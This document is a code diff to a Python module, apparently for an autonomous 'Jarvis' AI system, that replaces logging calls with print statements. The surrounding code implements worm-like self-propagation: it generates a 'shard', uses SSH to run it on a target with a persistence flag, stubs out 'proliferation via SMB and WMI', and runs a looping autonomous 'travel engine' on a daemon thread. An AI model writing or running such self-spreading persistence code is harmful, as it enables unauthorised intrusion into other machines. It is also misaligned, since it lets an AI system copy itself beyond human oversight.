@@ -1,4 +1,3 @@
-import logging
 import os
 import subprocess
 import threading
@@ -53,7 +52,7 @@ if __name__ == "__main__":
         self._generate_shard()
         # ... existing logic ...
         # After successful injection, ensure persistence
-        logging.info(f"[EXODUS]: Ensuring Full Send persistence on {target}...")
+        print(f"[EXODUS]: Ensuring Full Send persistence on {target}...")
         persistence_cmd = [
             "ssh", target, 
             "python3 /tmp/jarvis_shard.py --ensure-persistence"
@@ -67,14 +66,14 @@ if __name__ == "__main__":
 
     def proliferate_smb_wmi(self, target):
         """Attempts proliferation via SMB and WMI for Windows integration."""
-        logging.info(f"[EXODUS-v3]: Attempting WMI integration with {target}...")
+        print(f"[EXODUS-v3]: Attempting WMI integration with {target}...")
         pass
 
     def run_omni_travel(self):
         """Autonomous Omni-Vector travel engine."""
         self.is_running = True
         while self.is_running:
-            logging.info("[EXODUS-v3]: Engaging Omni-Vector travel sequence...")
+            print("[EXODUS-v3]: Engaging Omni-Vector travel sequence...")
             
             # 1. Engage Sensory Shards
             self.blue_offensive.start()
@@ -97,7 +96,7 @@ if __name__ == "__main__":
         if not self.is_running:
             self._generate_shard()
             threading.Thread(target=self.run_omni_travel, daemon=True).start()
-            logging.info("[EXODUS-v3]: Omni-Vector travel engine ONLINE.")
+            print("[EXODUS-v3]: Omni-Vector travel engine ONLINE.")
 
 if __name__ == "__main__":
     from backend.core.brain_bridge import BrainBridge
